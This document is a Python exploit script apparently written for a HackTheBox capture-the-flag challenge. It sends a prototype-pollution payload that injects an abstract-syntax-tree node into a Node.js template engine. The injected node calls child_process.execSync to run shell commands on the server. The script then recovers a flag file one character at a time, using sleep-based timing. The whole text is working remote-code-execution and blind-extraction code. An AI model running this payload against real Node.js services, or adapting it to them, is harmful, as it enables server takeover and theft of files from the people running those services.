import requests
import string

TARGET_URL = 'http://docker.hackthebox.eu:32672'

# Ref: https://blog.p6.is/AST-Injection/
def run_command(command):
    # make pollution
    res = requests.post(TARGET_URL + '/api/submit', json = {
        "artist.name": "Haigh",
        "__proto__.type": "Program",
        "__proto__.body": [{
            "type": "MustacheStatement",
            "path": 0,
            "params": [{
                "type": "NumberLiteral",
                "value": "process.mainModule.require('child_process').execSync(`{}`)".format(command)
            }],
            "loc": {
                "start": 0,
                "end": 0
            }
        }]
    })

    # execute
    requests.get(TARGET_URL)
    return res.elapsed.total_seconds()

# Time based guessing of the flag using sleeps character by character
exploit = 'export STR=$(head -c {} $(find -name "flag*")) && [ "$STR" == "{}" ] && sleep 3'
flag = ""
failed = 0
while not failed:
    for c in string.printable:
        failed = 1
        t = run_command(exploit.format(len(flag) + 1, flag + c))
        if t > 1:
            # We have found something this iteration
            failed = 0
            flag += c
            print(flag)
            break

